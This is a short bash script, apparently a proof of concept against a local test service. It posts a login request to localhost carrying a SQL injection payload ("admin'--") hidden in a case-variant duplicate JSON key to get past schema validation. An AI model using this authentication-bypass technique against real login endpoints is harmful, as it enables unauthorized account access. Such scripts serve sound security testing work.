#!/bin/bash

echo "Trying to log into account 'admin'"
echo ""
json="{\"username\":\"admin\", \"Username\": \"admin'--\", \"password\":\"password123\"}"
echo "Trying SQL injection with JSON schema bypassing:"
echo "Sending $json"
echo "Received response:"
curl localhost:8080/api/login \
	-H "Content-Type: application/json" \
	-d "$json"
echo ""
